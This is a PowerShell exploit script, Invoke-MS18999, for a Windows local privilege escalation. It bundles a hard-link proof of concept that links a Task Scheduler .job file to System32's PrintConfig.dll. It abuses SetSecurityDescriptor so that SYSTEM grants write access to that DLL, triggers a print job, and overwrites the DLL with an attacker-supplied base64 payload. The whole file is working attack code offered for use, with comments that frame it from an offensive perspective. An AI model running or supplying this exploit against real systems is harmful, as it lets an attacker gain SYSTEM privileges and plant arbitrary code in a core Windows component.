Function Invoke-MS18999 {
param($DLL)

    $TargetFile = (get-item 'C:\windows\System32\DriverStore\FileRepository\prnms003.inf_amd64_*\Amd64\PrintConfig.dll').fullname
    $TaskFolder = [System.Guid]::NewGuid().Guid

    function Native-HardLink {
    <#
    .SYNOPSIS
        This is a proof-of-concept for NT hard links. There are some advantages, from an offensive
        perspective, to using NtSetInformationFile to create hard links (as opposed to
        mklink/CreateHardLink). NtSetInformationFile allows us link to files we dont have write
        access to. In the script I am performing some steps which are not strictly speaking
        necessary, like using GetFullPathName for path resolution, I have done this mostly to
        educate myself.

        Be smart, you can create a hard links which you wont be able to delete afterwards dont
        shoot yourself in the foot.

        Resources:
            - https://github.com/google/symboliclink-testing-tools
            - https://googleprojectzero.blogspot.com/2015/12/between-rock-and-hard-link.html

    .DESCRIPTION
        Author: Ruben Boonen (@FuzzySec)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .PARAMETER Link
        The full path to hard link.

    .PARAMETER Target
        The full path to the file we are linking to.

    .EXAMPLE
        C:\PS> Native-HardLink -Link C:\Some\Path\Hard.Link -Target C:\Some\Path\Target.file
        True
    #>

        [CmdletBinding()]
        param(
            [Parameter(Mandatory = $True)]
            [String]$Link,
            [Parameter(Mandatory = $True)]
            [String]$Target
        )

        # Native API Definitions
        Add-Type -TypeDefinition @"
        using System;
        using System.Diagnostics;
        using System.Runtime.InteropServices;
        using System.Security.Principal;

        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_ATTRIBUTES
        {
            public Int32 Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public UInt32 Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IO_STATUS_BLOCK
        {
            public IntPtr Status;
            public IntPtr Information;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING
        {
            public UInt16 Length;
            public UInt16 MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
        public struct FILE_LINK_INFORMATION
        {
            [MarshalAs(UnmanagedType.U1)]
            public bool ReplaceIfExists;
            public IntPtr RootDirectory;
            public UInt32 FileNameLength;
            [MarshalAs(UnmanagedType.ByValTStr,SizeConst=260)]
            public String FileName;
        }

        public static class NtHardLink
        {
            [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
            public static extern UInt32 GetFullPathName(
                String lpFileName,
                UInt32 nBufferLength,
                System.Text.StringBuilder lpBuffer,
                ref IntPtr FnPortionAddress);

            [DllImport("kernel32.dll")]
            public static extern bool CloseHandle(
                IntPtr hObject);

            [DllImport("ntdll.dll")]
            public static extern UInt32 NtOpenFile(
                ref IntPtr FileHandle,
                UInt32 DesiredAccess,
                ref OBJECT_ATTRIBUTES ObjAttr,
                ref IO_STATUS_BLOCK IoStatusBlock,
                UInt32 ShareAccess,
                UInt32 OpenOptions);

            [DllImport("ntdll.dll")]
            public static extern UInt32 NtSetInformationFile(
                IntPtr FileHandle,
                ref IO_STATUS_BLOCK IoStatusBlock,
                IntPtr FileInformation,
                UInt32 Length,
                UInt32 FileInformationClass);
        }
"@

        function Emit-UNICODE_STRING {
            param(
                [String]$Data
            )

            $UnicodeObject = New-Object UNICODE_STRING
            $UnicodeObject_Buffer = $Data
            [UInt16]$UnicodeObject.Length = $UnicodeObject_Buffer.Length*2
            [UInt16]$UnicodeObject.MaximumLength = $UnicodeObject.Length+1
            [IntPtr]$UnicodeObject.Buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($UnicodeObject_Buffer)
            [IntPtr]$InMemoryStruct = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(16) # enough for x32/x64
            [system.runtime.interopservices.marshal]::StructureToPtr($UnicodeObject, $InMemoryStruct, $true)

            $InMemoryStruct
        }

        function Get-FullPathName {
            param(
                [String]$Path
            )

            $lpBuffer = New-Object -TypeName System.Text.StringBuilder
            $FnPortionAddress = [IntPtr]::Zero

            # Call to get buffer length
            $CallResult = [NtHardLink]::GetFullPathName($Path,1,$lpBuffer,[ref]$FnPortionAddress)

            if ($CallResult -ne 0) {
                # Set buffer length and re-call
                $lpBuffer.EnsureCapacity($CallResult)|Out-Null
                $CallResult = [NtHardLink]::GetFullPathName($Path,$lpBuffer.Capacity,$lpBuffer,[ref]$FnPortionAddress)
                $FullPath = "\??\" + $lpBuffer.ToString()
            } else {
                $FullPath = $false
            }

            # Return FullPath
            $FullPath
        }

        function Get-NativeFileHandle {
            param(
                [String]$Path
            )

            $FullPath = Get-FullPathName -Path $Path
            if ($FullPath) {
                # IO.* does not support full path name on Win7
                if (![IO.File]::Exists($Path)) {
                    Write-Verbose "[!] Invalid file path specified.."
                    $false
                    Return
                }
            } else {
                Write-Verbose "[!] Failed to retrieve fully qualified path.."
                $false
                Return
            }

            # Prepare NtOpenFile params
            [IntPtr]$hFile = [IntPtr]::Zero
            $ObjAttr = New-Object OBJECT_ATTRIBUTES
            $ObjAttr.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($ObjAttr)
            $ObjAttr.ObjectName = Emit-UNICODE_STRING -Data $FullPath
            $ObjAttr.Attributes = 0x40
            $IoStatusBlock = New-Object IO_STATUS_BLOCK

            # DesiredAccess = MAXIMUM_ALLOWED; ShareAccess = FILE_SHARE_READ
            $CallResult = [NtHardLink]::NtOpenFile([ref]$hFile,0x02000000,[ref]$ObjAttr,[ref]$IoStatusBlock,0x1,0x0)
            if ($CallResult -eq 0) {
                $Handle = $hFile
            } else {
                Write-Verbose "[!] Failed to acquire file handle, NTSTATUS($('{0:X}' -f $CallResult)).."
                $Handle = $false
            }

            # Return file handle
            $Handle
        }

        function Create-NtHardLink {
            param(
                [String]$Link,
                [String]$Target
            )

            $LinkFullPath = Get-FullPathName -Path $Link
            # IO.* does not support full path name on Win7
            $LinkParent = [IO.Directory]::GetParent($Link).FullName
            if (![IO.Directory]::Exists($LinkParent)) {
                Write-Verbose "[!] Invalid link folder path specified.."
                $false
                Return
            }
            

            # Create pFileLinkInformation & IOStatusBlock struct
            $FileLinkInformation = New-Object FILE_LINK_INFORMATION
            $FileLinkInformation.ReplaceIfExists = $true
            $FileLinkInformation.FileName = $LinkFullPath
            $FileLinkInformation.RootDirectory = [IntPtr]::Zero
            $FileLinkInformation.FileNameLength = $LinkFullPath.Length * 2
            $FileLinkInformationLen = [System.Runtime.InteropServices.Marshal]::SizeOf($FileLinkInformation)
            $pFileLinkInformation = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($FileLinkInformationLen)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($FileLinkInformation, $pFileLinkInformation, $true)
            $IoStatusBlock = New-Object IO_STATUS_BLOCK

            # Get handle to target
            $hTarget = Get-NativeFileHandle -Path $Target
            if (!$hTarget) {
                $false
                Return
            }

            # FileInformationClass => FileLinkInformation = 0xB
            $CallResult = [NtHardLink]::NtSetInformationFile($hTarget,[ref]$IoStatusBlock,$pFileLinkInformation,$FileLinkInformationLen,0xB)
            if ($CallResult -eq 0) {
                $true
            } else {
                Write-Verbose "[!] Failed to create hardlink, NTSTATUS($('{0:X}' -f $CallResult)).."
            }

            # Free file handle
            $CallResult = [NtHardLink]::CloseHandle($hTarget)
        }

        # Create Hard Link
        Create-NtHardLink -Link $Link -Target $Target
    }

    # make a native hardlink
    $Hardlink = Native-HardLink -Link "C:\Windows\Tasks\$($TaskFolder).job" -Target $TargetFile
    if(-not $Hardlink)
    {
        Write-Output "Exploit Failed, unable to hardlink '$TargetFile'."
        return
    }

    # DACL to use
    $DACL = 'D:(A;;FA;;;BA)(A;OICIIO;GA;;;BA)(A;;FA;;;SY)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;AU)(A;OICIIO;SDGXGWGR;;;AU)(A;;0x1200a9;;;BU)(A;OICIIO;GXGR;;;BU)'

    try {
        # create folder and update permissions so that we now have control over the system32 executable 
        $SService = New-Object -ComObject Schedule.Service
        $SService.Connect()
        $RootFolder = $SService.GetFolder('\')
        $ExploitFolder = $RootFolder.CreateFolder($TaskFolder)
        $ExploitFolder.SetSecurityDescriptor($DACL, 0)

        Write-Output "Exploit Successful, you just need to trigger the XPS print job."
        Write-Output 'shell $a=Start-Process C:\Windows\Tasks\TriggerXPSPrint.exe -PassThru;sleep 5;Stop-Process -Id $a.Id -Force'

        # We shall try to trigger it, but I think the PowerShell process needs to close first before this works
        # hence why I ask for a manual interaction and trigger after module is complete
        $a = Start-Process C:\Windows\Tasks\TriggerXPSPrint.exe -PassThru
        Start-Sleep 5
        Stop-Process -Id $a.Id -Force

    }
    catch {
        Write-Output "Exploit Failed, most likely SYSTEM has insufficent permissions on '$TargetFile'."
    }

    # overwrite malicious DLL
    $raw_dll = [convert]::FromBase64String($DLL)
    try {
        $raw_dll | Set-Content $TargetFile -Encoding Byte -ErrorAction Stop    
    }
    catch {
        Write-Output "Exploit Failed, most likely SYSTEM has insufficent permissions on '$TargetFile'."
    }


}


